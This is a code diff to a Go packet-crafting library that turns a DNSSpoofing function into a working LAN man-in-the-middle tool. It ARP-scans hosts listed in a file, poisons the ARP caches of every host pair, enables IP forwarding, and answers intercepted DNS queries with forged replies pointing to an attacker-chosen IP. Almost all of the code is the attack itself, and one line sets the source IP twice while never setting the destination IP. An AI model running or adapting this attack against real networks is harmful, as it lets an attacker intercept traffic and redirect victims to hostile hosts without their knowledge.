@@ -1,68 +1,122 @@
 package higherlevel
 
 import (
+	"bufio"
 	"fmt"
 	"github.com/google/gopacket/layers"
 	craft "github.com/tiagomdiogo/GoPpy/packet"
 	"github.com/tiagomdiogo/GoPpy/supersocket"
+	"github.com/tiagomdiogo/GoPpy/utils"
 	"log"
+	"net"
+	"os"
 )
 
-func DNSSpoofing(srcIP, dstIP, srcPort, dstPort, iface, queryDomain, answerIP string) error {
-	// Open a live packet capture
-	SuperS, err := supersocket.NewSuperSocket(iface, "")
+func parseHosts(hosts string, mapList map[string]string, iface string) {
+	file, err := os.Open(hosts)
 	if err != nil {
-		return fmt.Errorf("failed to initialize SuperSocket: %v", err)
+		log.Fatalf("Error opening file: %v", err)
 	}
-	defer SuperS.Close()
+	defer file.Close()
 
-	for {
-		// Receive a packet
-		packet, err := SuperS.Recv()
-		if err != nil {
-			return fmt.Errorf("failed to receive packet: %v", err)
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		line := scanner.Text()
+
+		// Check if the line is a valid IP address.
+		if net.ParseIP(line) != nil {
+			macAddress, err := ARPScan(iface, line)
+			if err != nil {
+				log.Fatal(err)
+			}
+			mapList[line] = macAddress
 		}
+	}
+	return
 
-		dnsLayer := packet.Layer(layers.LayerTypeDNS)
-		if dnsLayer == nil {
-			continue
-		}
+}
+func PoisonArp(mapList map[string]string, iface string, SuperS *supersocket.SuperSocket) {
 
-		dns, _ := dnsLayer.(*layers.DNS)
-
-		// Check if it's a DNS query for the domain we are spoofing
-		for _, q := range dns.Questions {
-			if string(q.Name) == queryDomain && q.Type == layers.DNSTypeA && q.Class == layers.DNSClassIN {
-				log.Printf("Spoofing DNS response for domain %s\n", queryDomain)
-
-				// Craft IP Layer
-				ipLayer := craft.IPv4Layer()
-				ipLayer.SetSrcIP(srcIP)
-				ipLayer.SetDstIP(dstIP)
-
-				// Craft UDP layer
-				udpLayer := craft.UDPLayer()
-				udpLayer.SetSrcPort(srcPort)
-				udpLayer.SetDstPort(dstPort)
-
-				//Craft DNS Layer
-				dnsLayer := craft.DNSLayer()
-				dnsLayer.AddAnswer(queryDomain, answerIP)
-
-				// Craft the packet
-				dnsResponse, err := craft.CraftPacket(ipLayer.Layer(), udpLayer.Layer(), dnsLayer.Layer())
-				if err != nil {
-					return err
-				}
-
-				// Send the spoofed response
-				err = SuperS.Send(dnsResponse)
-				if err != nil {
-					return fmt.Errorf("failed to send packet: %v", err)
-				}
-
-				return nil
+	macInt := utils.MacByInt(iface)
+	for addr1, mac1 := range mapList {
+		for addr2, mac2 := range mapList {
+			if addr1 != addr2 {
+				fmt.Printf("Spoofing ARP cache: targetIP=%s, targetMac=%s, sourceIP=%s\n", addr1, mac1, addr2)
+				packet1, packet2 := CreateFakeArp(addr1, addr2, mac1, mac2, macInt)
+				SuperS.Send(packet1)
+				SuperS.Send(packet2)
 			}
 		}
 	}
+}
+
+func DNSSpoofing(iface, hosts, fakeIP string) {
+
+	SuperS, err := supersocket.NewSuperSocket(iface, "")
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	enableIPForwarding(iface)
+	defer disableIPForwarding()
+
+	ipMap := make(map[string]string)
+
+	parseHosts(hosts, ipMap, iface)
+	fmt.Println("All the MAC obtained")
+
+	fmt.Println("Poisoning the ARP cache of hosts")
+	PoisonArp(ipMap, iface, SuperS)
+
+	for {
+		packet, err := SuperS.Recv()
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		dns := packet.Layer(layers.LayerTypeDNS)
+		if dns == nil {
+			continue
+		}
+
+		ethLayer, _ := packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
+		ipLayer, _ := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
+		udpLayer, _ := packet.Layer(layers.LayerTypeUDP).(*layers.UDP)
+		dnsLayer, _ := dns.(*layers.DNS)
+
+		if dnsLayer.QR == false && dnsLayer.OpCode == layers.DNSOpCodeQuery {
+			//eth layer
+			ethToSend := craft.EthernetLayer()
+			ethToSend.SetDstMAC(ethLayer.SrcMAC.String())
+			ethToSend.SetSrcMAC(utils.MacByInt(iface))
+			ethToSend.SetEthernetType(ethLayer.EthernetType)
+
+			//iplayer
+			ipToSend := craft.IPv4Layer()
+			ipToSend.SetSrcIP(ipLayer.DstIP.String())
+			ipToSend.SetSrcIP(ipLayer.SrcIP.String())
+			ipToSend.SetProtocol(layers.IPProtocolUDP)
+
+			//udpLayer
+			udpToSend := craft.UDPLayer()
+			udpToSend.SetSrcPort(udpLayer.DstPort.String())
+			udpToSend.SetDstPort(udpLayer.SrcPort.String())
+
+			//dnsLayer
+			dnsToSend := craft.DNSLayer()
+			dnsToSend.Layer().ID = dnsLayer.ID
+			dnsToSend.Layer().AA = false
+			dnsToSend.Layer().ResponseCode = 0
+			dnsToSend.AddAnswer(string(dnsLayer.Questions[0].Name), fakeIP)
+
+			packetCrafted, err := craft.CraftPacket(ethToSend.Layer(), ipToSend.Layer(), udpToSend.Layer(), dnsToSend.Layer())
+
+			if err != nil {
+				log.Fatal(err)
+			}
+			SuperS.Send(packetCrafted)
+			PoisonArp(ipMap, iface, SuperS)
+		}
+	}
+
 }
